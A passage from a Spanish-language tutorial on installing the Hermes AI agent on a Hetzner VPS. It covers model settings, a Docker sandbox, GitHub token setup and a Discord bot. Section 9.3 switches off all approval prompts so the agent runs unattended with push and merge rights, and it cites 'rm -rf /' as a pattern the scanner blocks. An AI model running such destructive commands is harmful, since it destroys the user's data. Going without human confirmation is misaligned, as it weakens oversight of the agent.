> Otro detalle que confunde: en `hermes config`, el campo `𝗗𝗶𝘀𝗽𝗹𝗮𝘆 → 𝗥𝗲𝗮𝘀𝗼𝗻𝗶𝗻𝗴` se refiere a 𝗺𝗼𝘀𝘁𝗿𝗮𝗿 𝘂 𝗼𝗰𝘂𝗹𝘁𝗮𝗿 𝗲𝗹 𝗿𝗮𝘇𝗼𝗻𝗮𝗺𝗶𝗲𝗻𝘁𝗼 𝗲𝗻 𝗽𝗮𝗻𝘁𝗮𝗹𝗹𝗮, 𝗻𝗼 a `agent.reasoning_effort`. Son ajustes distintos: puedes tener `agent.reasoning_effort: medium` con `Display → Reasoning: on` o `off`, según quieras ver o esconder ese razonamiento en la salida.

Para verificar la configuración completa, comprueba también el archivo real:

```bash
grep -n "default:\\|delegation:\\|fallback_model:\\|reasoning_effort:\\|personality:\\|show_reasoning:\\|vision:\\|compression:" ~/.hermes/config.yaml
```

En el YAML deberías tener, como mínimo, algo equivalente a esto:

```yaml
model:
  default: qwen/qwen3.6-plus

delegation:
  provider: openrouter
  model: minimax/minimax-m2.7

auxiliary:
  vision:
    provider: openrouter
    model: google/gemini-3-flash-preview
  compression:
    provider: openrouter
    model: qwen/qwen3.6-plus

fallback_model:
  provider: openrouter
  model: minimax/minimax-m2.7

agent:
  reasoning_effort: medium

display:
  personality: technical
  show_reasoning: true

timezone: Europe/Madrid
```

### 8.3. Qué se hereda automáticamente y qué no

Esto es lo que más confunde al principio:

- Si 𝗻𝗼 configuras `delegation`, los subagentes heredan el modelo principal.
- `auxiliary.vision` y `auxiliary.compression` 𝗻𝗼 heredan automáticamente el modelo principal; usan su propia resolución auxiliar.
- `fallback_model` 𝗻𝗼 se deduce solo: si no lo defines, no hay failover explícito.
- `agent.reasoning_effort` no cambia de modelo; solo ajusta cómo usa el modelo elegido.

### 8.4. Cambiar de modelo en caliente

Desde CLI o desde Discord más adelante:

```text
/model openrouter:qwen/qwen3.6-plus
/model openrouter:minimax/minimax-m2.7
```

Úsalo para pruebas puntuales. Para que el comportamiento estable sobreviva reinicios, deja la configuración persistida con `hermes config set`.

---

## 9. Skills de código y backend Docker para ejecución segura

### 9.1. Activa el backend Docker

Esto hace que 𝘁𝗼𝗱𝗼𝘀 𝗹𝗼𝘀 𝗰𝗼𝗺𝗮𝗻𝗱𝗼𝘀 𝗾𝘂𝗲 𝗛𝗲𝗿𝗺𝗲𝘀 𝗲𝗷𝗲𝗰𝘂𝘁𝗲 (incluido `git`, `python`, `npm`, etc.) corran dentro de un contenedor sandbox, no directamente en el host.

Si prefieres dejarlo configurado sin tocar `config.yaml` a mano, ejecuta:

```bash
hermes config set terminal.backend docker
hermes config set terminal.docker_image nousresearch/hermes-agent:latest
hermes config set terminal.docker_mount_cwd_to_workspace true
hermes config set terminal.docker_volumes '["/home/hermes/projects:/workspace/projects","/home/hermes/.hermes/cache/documents:/output"]'
hermes config set terminal.docker_forward_env '["OPENROUTER_API_KEY"]'
hermes config set terminal.container_cpu 2
hermes config set terminal.container_memory 4096
hermes config set terminal.container_persistent true

hermes config set code_execution.mode project
hermes config set code_execution.timeout 300
hermes config set code_execution.max_tool_calls 50
```

> Para listas como `docker_volumes` y `docker_forward_env`, usa comillas simples por fuera y JSON por dentro, tal como en el ejemplo. Así Hermes lo guarda correctamente como array en `config.yaml`.
>
> De momento reenviamos solo `OPENROUTER_API_KEY`. `GITHUB_TOKEN` lo añadiremos en el paso 𝟵.𝟮.𝟰, cuando realmente configuremos GitHub. En `docker_forward_env` no van los valores reales de los secretos, sino 𝗹𝗼𝘀 𝗻𝗼𝗺𝗯𝗿𝗲𝘀 de las variables que Hermes debe copiar dentro del contenedor.
>
> En esta guía usamos `nousresearch/hermes-agent:latest` como imagen del sandbox porque la documentación oficial indica que ya incluye Python, Node, npm, Playwright con Chromium, `ripgrep` y `ffmpeg`. Para un VPS donde Hermes va a programar, navegar y automatizar, es más práctico partir de una imagen generalista ya preparada que de una imagen más mínima.
>
> Añadimos también este mount:
>
> ```text
> /home/hermes/.hermes/cache/documents:/output
> ```
>
> porque la documentación oficial recomienda un 𝗵𝗼𝘀𝘁-𝘃𝗶𝘀𝗶𝗯𝗹𝗲 𝗲𝘅𝗽𝗼𝗿𝘁 𝗺𝗼𝘂𝗻𝘁 cuando usas mensajería + backend Docker. Así, si Hermes genera un archivo dentro del contenedor, puede escribirlo en `/output/...` y luego el gateway del host lo ve en `/home/hermes/.hermes/cache/documents/...` para enviarlo por Discord, Telegram, etc.
>
> 𝗢𝗷𝗼 𝗰𝗼𝗻 𝗹𝗮𝘀 𝗲𝘅𝗽𝗲𝗰𝘁𝗮𝘁𝗶𝘃𝗮𝘀: este mount es necesario, pero no convierte el flujo de adjuntos en algo perfecto cuando separas 𝗴𝗮𝘁𝗲𝘄𝗮𝘆 𝗲𝗻 𝗵𝗼𝘀𝘁 y 𝗲𝗷𝗲𝗰𝘂𝗰𝗶𝗼𝗻 𝗲𝗻 𝘀𝗮𝗻𝗱𝗯𝗼𝘅 𝗗𝗼𝗰𝗸𝗲𝗿. 𝗗𝗲 𝗺𝗼𝗺𝗲𝗻𝘁𝗼 𝗲𝘀 𝘂𝗻𝗮 𝗹𝗶𝗺𝗶𝘁𝗮𝗰𝗶𝗼𝗻 𝗰𝗼𝗻𝗼𝗰𝗶𝗱𝗮 𝗱𝗲 𝗛𝗲𝗿𝗺𝗲𝘀: el puente de ficheros entre entornos sandboxed y usuarios finales todavia tiene huecos, asi que puedes encontrarte casos donde un archivo generado dentro del sandbox no salga bien por Discord/Telegram, o donde un adjunto recibido por mensajeria no quede accesible dentro de la sesion de ejecucion. Issue oficial:
> https://github.com/NousResearch/hermes-agent/issues/466
>
> Dejamos `terminal.container_cpu: 2` y `terminal.container_memory: 4096` porque en este tutorial estamos usando un 𝗛𝗲𝘁𝘇𝗻𝗲𝗿 𝗖𝗫𝟯𝟮 (4 vCPU, 8 GB RAM). Reservar 𝟮 𝘃𝗖𝗣𝗨 𝘆 𝟰 𝗚𝗕 para el sandbox Docker es un punto medio razonable: da margen suficiente para `npm`, `python`, builds, tests y browser tools sin comerse todos los recursos del VPS ni dejar sin aire al propio Hermes, al gateway y al sistema base.

```yaml
# añade/edita en ~/.hermes/config.yaml
terminal:
  backend: docker
  docker_image: nousresearch/hermes-agent:latest
  docker_mount_cwd_to_workspace: true
  docker_volumes:
    - "/home/hermes/projects:/workspace/projects"
    - "/home/hermes/.hermes/cache/documents:/output"
  docker_forward_env:
    - OPENROUTER_API_KEY
  container_cpu: 2
  container_memory: 4096
  container_persistent: true

code_execution:
  mode: project
  timeout: 300
  max_tool_calls: 50
```

> Ref: Configuration → Terminal Backends (https://hermes-agent.nousresearch.com/docs/user-guide/configuration/).

Si al arrancar el gateway como servicio ves una advertencia parecida a esta:

```text
WARNING gateway.run: Docker backend is enabled for the messaging gateway but no explicit host-visible output mount ...
```

significa que al contenedor le falta justo ese segundo mount de exportación. La forma correcta de evitarlo es dejar `docker_volumes` como en el ejemplo de arriba, con:

```text
/home/hermes/.hermes/cache/documents:/output
```

### 9.2. Skills útiles para programar

Hermes ya instala un buen número de 𝘀𝗸𝗶𝗹𝗹𝘀 𝗯𝘂𝗻𝗱𝗹𝗲𝗱 en `~/.hermes/skills/`, así que en este punto del tutorial 𝗻𝗼 𝗵𝗮𝗰𝗲 𝗳𝗮𝗹𝘁𝗮 𝗶𝗻𝘀𝘁𝗮𝗹𝗮𝗿 𝘀𝗸𝗶𝗹𝗹𝘀 𝗮𝗱𝗶𝗰𝗶𝗼𝗻𝗮𝗹𝗲𝘀 para empezar. Lo más útil es saber:

- qué skills te ha dejado ya disponibles
- cómo inspeccionarlas
- cómo añadir skills extra más adelante si aparece una necesidad concreta

### 9.2.1. Ver las skills que ya tienes

```bash
hermes skills list
```

Si quieres ver el catálogo oficial o buscar algo concreto:

```bash
hermes skills browse --source official
hermes skills search github
hermes skills search docker
```

Y si quieres inspeccionar una skill antes de usarla:

```bash
hermes skills inspect github-pr-workflow
hermes skills inspect writing-plans
```

### 9.2.2. Añadir más skills si las necesitas

Cuando detectes un workflow que Hermes no cubre bien de serie, puedes instalar skills adicionales desde el hub oficial o desde otras fuentes soportadas.

Ejemplos:

```bash
hermes skills install official/security/1password
hermes skills install openai/skills/k8s
```

También puedes buscar antes de instalar:

```bash
hermes skills search react --source skills-sh
hermes skills search kubernetes
```

> La documentación oficial explica que Hermes soporta varias fuentes de skills: las 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹 mantenidas dentro del ecosistema Hermes, skills servidas desde GitHub, skills.sh y otros hubs compatibles. Todas pasan por un escaneo de seguridad antes de instalarse.

### 9.2.3. Recomendación práctica para este tutorial

De momento, deja las skills como vienen y no sobrecargues el sistema con skills de terceros “por si acaso”.

La estrategia más sensata aquí es:

1. usar primero las skills bundled
2. observar qué tareas repites de verdad
3. instalar solo skills extra cuando tengas un caso claro

Así mantienes Hermes más simple, más predecible y más fácil de depurar.

### 9.2.4. Integrar GitHub para que Hermes vea repos, los clone y trabaje con PRs

La documentación oficial de Hermes ya trae resuelto este flujo con varias 𝘀𝗸𝗶𝗹𝗹𝘀 𝗯𝘂𝗻𝗱𝗹𝗲𝗱 de GitHub:

- `github-auth`: autenticación GitHub para el agente
- `github-repo-management`: clonar, crear, forkear y gestionar repositorios
- `github-pr-workflow`: ciclo completo de PR
- `github-code-review`: revisar cambios y PRs
- `github-issues`: crear y gestionar issues

Lo importante aquí es entender dos cosas:

1. Hermes 𝗻𝗼 𝗻𝗲𝗰𝗲𝘀𝗶𝘁𝗮 𝗼𝗯𝗹𝗶𝗴𝗮𝘁𝗼𝗿𝗶𝗮𝗺𝗲𝗻𝘁𝗲 `gh` para trabajar con GitHub.
2. Si `gh` está instalado y autenticado, Hermes lo aprovecha; si no, varias de estas skills hacen fallback a `𝗴𝗶𝘁` + 𝗚𝗶𝘁𝗛𝘂𝗯 𝗥𝗘𝗦𝗧 𝗔𝗣𝗜 𝘃𝗶́𝗮 `𝗰𝘂𝗿𝗹`.

Para este VPS, la ruta más simple y reproducible es usar un 𝗳𝗶𝗻𝗲-𝗴𝗿𝗮𝗶𝗻𝗲𝗱 𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼𝗸𝗲𝗻 de GitHub y dejarlo en `~/.hermes/.env`.

#### Token recomendado

Crea en GitHub un 𝗳𝗶𝗻𝗲-𝗴𝗿𝗮𝗶𝗻𝗲𝗱 𝗣𝗔𝗧 limitado solo a los repositorios con los que quieres que trabaje Hermes.

Para el caso de uso de esta guía, lo razonable es dar al token, como mínimo:

- `Metadata: read`
  necesario para listar y consultar repositorios
- `Contents: write`
  necesario para empujar cambios y también para hacer merge de PRs por API
- `Pull requests: write`
  necesario para abrir, actualizar y revisar pull requests

Opcionales según lo que quieras que haga:

- `Issues: write`
  si quieres que Hermes cree, etiquete o cierre issues
- `Workflows: write`
  si quieres que toque archivos de `.github/workflows/` o gestione workflows

> 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁𝗲: esto es una inferencia práctica a partir de la documentación oficial de GitHub para fine-grained tokens y de cómo Hermes usa sus skills de GitHub. Si trabajas con repos privados, no abras más permisos de los necesarios.

#### Guárdalo en Hermes

En el VPS:

```bash
nano ~/.hermes/.env
```

Y añade:

```env
GITHUB_TOKEN=github_pat_xxxxxxxxxxxxxxxxxxxx
```

#### Si usas backend Docker, reenvía también `GITHUB_TOKEN`

Como en esta guía estamos ejecutando Hermes con `terminal.backend: docker`, el contenedor necesita ver también esa variable:

```bash
hermes config set terminal.docker_forward_env '["OPENROUTER_API_KEY","GITHUB_TOKEN"]'
```

#### Qué skill usar para cada tarea

- Para comprobar autenticación:

```text
/github-auth comprueba cómo está autenticado GitHub en esta máquina y qué método usará Hermes
```

- Para ver o clonar repos:

```text
/github-repo-management clona owner/repo en /home/hermes/projects/nombre-del-repo
```

- Para crear ramas, commits y abrir PRs:

```text
/github-pr-workflow en este repo crea una rama nueva, prepara los commits necesarios y abre una draft PR contra main
```

- Para revisar una PR ya abierta:

```text
/github-code-review revisa la PR #123, resume riesgos y propone cambios si hace falta
```

- Para mergear una PR si todo está bien:

```text
/github-pr-workflow revisa la PR #123, comprueba CI y haz squash merge si todo está en verde
```

#### Limitación importante en este tutorial

Hermes solo podrá trabajar con:

- repositorios a los que tu token realmente tenga acceso
- repositorios clonados dentro de rutas que el sandbox Docker vea
- en esta guía, lo natural es clonar en:

```text
/home/hermes/projects/
```

porque ese directorio está montado dentro del contenedor como:

```text
/workspace/projects/
```

Así, cuando Hermes clone o modifique un repositorio, tanto el host como el sandbox verán los mismos archivos.

#### Verificación rápida

```bash
hermes skills list | grep github
grep '^GITHUB_TOKEN=' ~/.hermes/.env
```

Luego entra en Hermes y prueba algo simple:

```text
/github-auth
```

o:

```text
/github-repo-management lista mis opciones para trabajar con el repo owner/repo y dime si ya puedes operarlo desde este VPS
```

> Referencias oficiales:
> Bundled Skills Catalog → GitHub (https://hermes-agent.nousresearch.com/docs/reference/skills-catalog/)
> Working with Skills (https://hermes-agent.nousresearch.com/docs/guides/work-with-skills)
> CLI → Preloading Skills / Slash Commands (https://hermes-agent.nousresearch.com/docs/user-guide/cli)
> Environment Variables → `GITHUB_TOKEN` (https://hermes-agent.nousresearch.com/docs/reference/environment-variables)

#### Hazlo ahora mismo: configuración completa de GitHub

##### 1. Crea el token en GitHub

La ruta actual en GitHub es:

1. abre GitHub en el navegador
2. entra en `Settings`
3. entra en `Developer settings`
4. entra en `Personal access tokens`
5. elige `Fine-grained tokens`
6. pulsa `Generate new token`

La documentación oficial de GitHub recomienda usar 𝗳𝗶𝗻𝗲-𝗴𝗿𝗮𝗶𝗻𝗲𝗱 𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼𝗸𝗲𝗻𝘀 en vez de tokens clásicos siempre que sea posible.

Para esta guía, al crear el token configura:

- 𝗥𝗲𝘀𝗼𝘂𝗿𝗰𝗲 𝗼𝘄𝗻𝗲𝗿: tu usuario o tu organización
- 𝗥𝗲𝗽𝗼𝘀𝗶𝘁𝗼𝗿𝘆 𝗮𝗰𝗰𝗲𝘀𝘀: `Only select repositories`
- selecciona solo los repos que quieres que Hermes pueda tocar
- 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: pon una caducidad razonable, por ejemplo 30 o 90 días

En 𝗥𝗲𝗽𝗼𝘀𝗶𝘁𝗼𝗿𝘆 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻𝘀, marca como mínimo:

- `Metadata: Read-only`
- `Contents: Read and write`
- `Pull requests: Read and write`

Si quieres que también gestione issues:

- `Issues: Read and write`

Si quieres que toque workflows de GitHub Actions:

- `Workflows: Read and write`

> Si el repo pertenece a una organización, puede que el token quede en estado `pending` hasta que un admin lo apruebe. GitHub lo documenta así para fine-grained tokens sobre organizaciones.

##### 2. Guárdalo en Hermes

En el VPS:

```bash
nano ~/.hermes/.env
```

Añade esta línea:

```env
GITHUB_TOKEN=github_pat_xxxxxxxxxxxxxxxxxxxx
```

##### 3. Reenvíalo también al sandbox Docker

Como Hermes en esta guía trabaja dentro de Docker, añade `GITHUB_TOKEN` al reenvío de variables:

```bash
hermes config set terminal.docker_forward_env '["OPENROUTER_API_KEY","GITHUB_TOKEN"]'
```

##### 4. Comprueba que Hermes ya lo ve

```bash
grep '^GITHUB_TOKEN=' ~/.hermes/.env
hermes skills list | grep github
```

Opcionalmente, si tienes `gh` instalado en el VPS, puedes comprobar también:

```bash
gh auth status
```

Si no tienes `gh`, no pasa nada: Hermes puede seguir operando con sus skills usando `git` + API REST.

##### 5. Prueba real desde Hermes

Primero entra en Hermes:

```bash
hermes
```

Y luego prueba una de estas órdenes:

```text
/github-auth comprueba si ya puedes usar GitHub desde este VPS y qué método de autenticación estás detectando
```

```text
/github-repo-management dime si puedes clonar el repositorio owner/repo en /home/hermes/projects/owner-repo y qué te falta para hacerlo
```

Si quieres probar un clonado real:

```text
/github-repo-management clona owner/repo en /home/hermes/projects/owner-repo
```

##### 6. Qué deberías poder hacer después

Si el token y el acceso al repo están bien, Hermes ya debería poder:

- ver tus repositorios permitidos
- clonarlos en `/home/hermes/projects/`
- crear ramas
- hacer commits
- abrir pull requests
- revisar pull requests
- mergearlas si el token y las reglas del repo lo permiten

##### 7. Si algo falla

Los fallos más típicos aquí son:

- el token no tiene acceso al repo concreto
- falta `Contents: write`
- falta `Pull requests: write`
- la organización exige aprobación del token
- el repo tiene reglas de protección que impiden merge automático

> Referencias oficiales de GitHub:
> Managing your personal access tokens (https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens)
> Permissions required for fine-grained personal access tokens (https://docs.github.com/en/rest/authentication/permissions-required-for-fine-grained-personal-access-tokens?apiVersion=latest)
> REST API → Merge a pull request (https://docs.github.com/en/rest/pulls/pulls?apiVersion=2026-03-10)

### 9.3. Aprobaciones automáticas (modo off)

Como 𝘁𝗼𝗱𝗼𝘀 𝗹𝗼𝘀 𝗰𝗼𝗺𝗮𝗻𝗱𝗼𝘀 𝘀𝗲 𝗲𝗷𝗲𝗰𝘂𝘁𝗮𝗻 𝗱𝗲𝗻𝘁𝗿𝗼 𝗱𝗲𝗹 𝗰𝗼𝗻𝘁𝗲𝗻𝗲𝗱𝗼𝗿 𝗗𝗼𝗰𝗸𝗲𝗿 del paso 9.1, puedes apagar las aprobaciones por completo. Esto permite que Hermes trabaje 100 % desatendido desde Discord sin pedirte confirmación cuando lanza `npm install`, `docker compose up`, `git push`, etc.

```bash
hermes config set approvals.mode off
hermes config set security.redact_secrets true
hermes config set security.tirith_enabled true
hermes config set security.tirith_timeout 5
hermes config set security.tirith_fail_open true
```

𝗣𝗼𝗿 𝗾𝘂𝗲́ 𝗲𝘀 𝗿𝗮𝘇𝗼𝗻𝗮𝗯𝗹𝗲 𝗵𝗮𝗰𝗲𝗿𝗹𝗼 𝗮𝗾𝘂𝗶́:

- El sandbox Docker (`terminal.backend: docker`) aísla a Hermes del sistema base del VPS.
- Lo que sí podrá tocar son los directorios que tú montes dentro del contenedor, por ejemplo `/home/hermes/projects`, así que el aislamiento es 𝘂́𝘁𝗶𝗹 𝗽𝗲𝗿𝗼 𝗻𝗼 𝗮𝗯𝘀𝗼𝗹𝘂𝘁𝗼.
- `tirith_enabled: true` aplica análisis estático antes de ejecutar y bloquea patrones obviamente destructivos (p.ej. `rm -rf /`).
- `redact_secrets` enmascara `.env`, tokens y keys antes de enviar al LLM, así no se filtran al historial de OpenRouter.
- `DISCORD_ALLOWED_USERS` ya restringe quién puede dar órdenes al agente.
- Hetzner hace snapshot diario (paso 3.3): si algo se rompe, restauras.

> Si en algún momento prefieres volver a confirmaciones, cambia a `mode: smart` (Hermes pregunta solo en lo destructivo, usando el modelo auxiliar) o `mode: manual` (todo confirmado). Ref: Configuration → Security & Approvals (https://hermes-agent.nousresearch.com/docs/user-guide/configuration/).

### 9.4. Browser automation: lo dejamos para una iteración posterior

Hermes soporta navegación web y automatización de navegador, tanto con browser local como con proveedores cloud. Pero en 𝗲𝘀𝘁𝗲 𝗩𝗣𝗦 𝗰𝗼𝗻𝗰𝗿𝗲𝘁𝗼 no hemos dejado el camino de navegador completamente validado y estable todavía.

En las pruebas reales de esta guía nos pasó esto:

- el `browser` toolset sí intenta abrir páginas
- pero el navegador local cae por problemas de 𝘀𝗮𝗻𝗱𝗯𝗼𝘅
- y Hermes hace fallback a herramientas como `curl` o extracción por terminal/Python

Por tanto, para que este tutorial refleje el estado real del sistema, 𝗻𝗼 𝘃𝗮𝗺𝗼𝘀 𝗮 𝘃𝗲𝗻𝗱𝗲𝗿 𝘁𝗼𝗱𝗮𝘃𝗶́𝗮 “𝗖𝗵𝗿𝗼𝗺𝗶𝘂𝗺 𝗹𝗼𝗰𝗮𝗹 𝗳𝘂𝗻𝗰𝗶𝗼𝗻𝗮𝗻𝗱𝗼” 𝗰𝗼𝗺𝗼 𝗽𝗮𝗿𝘁𝗲 𝗱𝗲𝗹 𝘀𝗲𝘁𝘂𝗽 𝗯𝗮𝘀𝗲.

Qué dejamos sí preparado:

- la imagen Docker `nousresearch/hermes-agent:latest`, que es una buena base generalista
- el espacio para trabajar más adelante con `agent-browser`, CDP o un proveedor cloud
- la constatación de que el backend principal de Hermes, Discord, Docker sandbox y modelos LLM sí funcionan

Si más adelante activas un proveedor cloud como 𝗕𝗿𝗼𝘄𝘀𝗲𝗿 𝗨𝘀𝗲, la regla práctica es esta:

- para que Hermes use Browser Use, basta con definir `BROWSER_USE_API_KEY`
- si además tienes variables `BROWSERBASE_*`, lo importante es que 𝗻𝗼 estén definidas `BROWSERBASE_API_KEY` ni `BROWSERBASE_PROJECT_ID`
- variables como `BROWSER_SESSION_TIMEOUT` o `BROWSER_INACTIVITY_TIMEOUT` pueden quedarse, porque no activan Browserbase por sí solas
- por claridad, si no vas a usar Browserbase, conviene comentar también `BROWSERBASE_PROXIES` y `BROWSERBASE_ADVANCED_STEALTH`

Qué dejamos fuera de este walkthrough base:

- instalación y validación completa de Chromium local
- conexión por CDP a un navegador del host
- automatización browser end-to-end confirmada desde Discord

> En otras palabras: 𝗯𝗿𝗼𝘄𝘀𝗲𝗿 𝗮𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗼𝗻 𝗾𝘂𝗲𝗱𝗮 𝗰𝗼𝗺𝗼 𝗽𝗿𝗼́𝘅𝗶𝗺𝗼 𝗽𝗮𝘀𝗼, no como requisito para dar por buena esta instalación de Hermes en Hetzner.

---

## 10. Conectar Hermes con Discord

Sigue docs/user-guide/messaging/discord (https://hermes-agent.nousresearch.com/docs/user-guide/messaging/discord).

En este tutorial solo vamos a tocar tres apartados del portal de Discord:

- `Información general`: para sacar el `Application ID` y dar nombre/icono a la app
- `Instalaciones`: para controlar cómo invitas el bot a tu servidor
- `Bot`: para sacar el token, definir privacidad e intents

El resto (`OAuth2`, `Emojis`, `Webhooks`, `Rich Presence`, `Testers`, `Verificación`) no lo necesitamos para este flujo.

### 10.1. Crea la app y el bot

1. Entra en https://discord.com/developers/applications → 𝗡𝗲𝘄 𝗔𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻 → nombre `Hermes Lab`.
2. En 𝗚𝗲𝗻𝗲𝗿𝗮𝗹 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:
   - pon nombre, icono y descripción si quieres
   - no hace falta tocar OAuth2, Interactions Endpoint URL ni nada de webhooks para Hermes por gateway
3. Pestaña 𝗕𝗼𝘁:
   - 𝗣𝘂𝗯𝗹𝗶𝗰 𝗕𝗼𝘁: 𝗢𝗙𝗙.
   - 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝘀 𝗢𝗔𝘂𝘁𝗵𝟮 𝗖𝗼𝗱𝗲 𝗚𝗿𝗮𝗻𝘁: 𝗢𝗙𝗙.
   - 𝗣𝗿𝗶𝘃𝗶𝗹𝗲𝗴𝗲𝗱 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗜𝗻𝘁𝗲𝗻𝘁𝘀:
     - ❌ 𝗣𝗿𝗲𝘀𝗲𝗻𝗰𝗲 𝗜𝗻𝘁𝗲𝗻𝘁: 𝗢𝗙𝗙 (Hermes no lo necesita para este caso).
     - ✅ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗖𝗼𝗻𝘁𝗲𝗻𝘁 𝗜𝗻𝘁𝗲𝗻𝘁: 𝗢𝗡 (obligatorio para que Hermes lea el texto de los mensajes normales).
     - ✅ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗠𝗲𝗺𝗯𝗲𝗿𝘀 𝗜𝗻𝘁𝗲𝗻𝘁: 𝗢𝗡. La documentación oficial de Hermes lo trata como requerido para poder resolver correctamente usuarios permitidos y evitar fallos de identificación.
4. 𝗥𝗲𝘀𝗲𝘁 𝗧𝗼𝗸𝗲𝗻 → copia el token (solo se muestra una vez).

> 𝗤𝘂𝗲́ 𝘀𝗶𝗴𝗻𝗶𝗳𝗶𝗰𝗮 `𝗣𝘂𝗯𝗹𝗶𝗰 𝗕𝗼𝘁`: si está en `ON`, otros usuarios con permisos suficientes podrían invitar tu bot a sus propios servidores. Si quieres que esta instancia de Hermes sea solo tuya, déjalo en 𝗢𝗙𝗙.
>
> Incluso con `Public Bot: OFF`, mantén `DISCORD_ALLOWED_USERS` configurado con tu propio User ID. Eso hace que, aunque el bot esté presente en un servidor, Hermes ignore a cualquier usuario no autorizado por seguridad.

> 𝗤𝘂𝗲́ 𝘀𝗶𝗴𝗻𝗶𝗳𝗶𝗰𝗮 `𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝘀 𝗢𝗔𝘂𝘁𝗵𝟮 𝗖𝗼𝗱𝗲 𝗚𝗿𝗮𝗻𝘁`: déjalo en 𝗢𝗙𝗙. Ese flujo completo de OAuth2 no es necesario para el uso normal de Hermes como bot en tu servidor y solo complica la instalación.

> 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁𝗲 𝗰𝗼𝗻 𝗹𝗮 𝗨𝗜 𝗮𝗰𝘁𝘂𝗮𝗹 𝗱𝗲 𝗗𝗶𝘀𝗰𝗼𝗿𝗱: en la pestaña 𝗕𝗼𝘁 ves también una gran tabla de “Permisos del bot”. Tómala como calculadora o referencia. En la práctica, si usas 𝗗𝗶𝘀𝗰𝗼𝗿𝗱 𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗱 𝗟𝗶𝗻𝗸, los permisos que importan para la instalación se fijan en la pestaña 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗮𝘁𝗶𝗼𝗻, dentro de 𝗗𝗲𝗳𝗮𝘂𝗹𝘁 𝗜𝗻𝘀𝘁𝗮𝗹𝗹 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀.

📸 [images/11-discord-bot-intents.png]

### 10.2. Genera el invite link

En la documentación oficial de Hermes hay dos caminos:

- 𝗢𝗽𝘁𝗶𝗼𝗻 𝗔: 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗮𝘁𝗶𝗼𝗻 𝘁𝗮𝗯 → recomendado solo si `Public Bot = ON`
- 𝗢𝗽𝘁𝗶𝗼𝗻 𝗕: 𝗠𝗮𝗻𝘂𝗮𝗹 𝗨𝗥𝗟 → obligatorio si `Public Bot = OFF`

Como en 𝗲𝘀𝘁𝗮 𝗴𝘂𝗶́𝗮 𝗾𝘂𝗲𝗿𝗲𝗺𝗼𝘀 𝗲𝗹 𝗯𝗼𝘁 𝗽𝗿𝗶𝘃𝗮𝗱𝗼, 𝗻𝘂𝗲𝘀𝘁𝗿𝗼 𝗰𝗮𝘀𝗼 𝗲𝘀 𝗢𝗽𝘁𝗶𝗼𝗻 𝗕: 𝗠𝗮𝗻𝘂𝗮𝗹 𝗨𝗥𝗟.

1. Ve a 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗮𝘁𝗶𝗼𝗻.
2. En 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗮𝘁𝗶𝗼𝗻 𝗖𝗼𝗻𝘁𝗲𝘅𝘁𝘀:
   - ✅ 𝗚𝘂𝗶𝗹𝗱 𝗜𝗻𝘀𝘁𝗮𝗹𝗹: 𝗢𝗡
   - ❌ 𝗨𝘀𝗲𝗿 𝗜𝗻𝘀𝘁𝗮𝗹𝗹: 𝗢𝗙𝗙
3. Si ves 𝗗𝗶𝘀𝗰𝗼𝗿𝗱 𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗱 𝗟𝗶𝗻𝗸, tómalo solo como referencia visual del portal, 𝗽𝗲𝗿𝗼 𝗻𝗼 𝗹𝗼 𝘂𝘀𝗲𝘀: con `Public Bot = OFF`, la propia documentación de Hermes indica que debes invitar el bot con una 𝗠𝗮𝗻𝘂𝗮𝗹 𝗨𝗥𝗟.
4. Copia tu 𝗔𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗜𝗗 desde 𝗚𝗲𝗻𝗲𝗿𝗮𝗹 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻.
5. Construye esta URL manual:

```text
https://discord.com/oauth2/authorize?client_id=TU_APPLICATION_ID&scope=bot+applications.commands&permissions=274878286912
```

Sustituye `TU_APPLICATION_ID` por el ID real de tu aplicación.

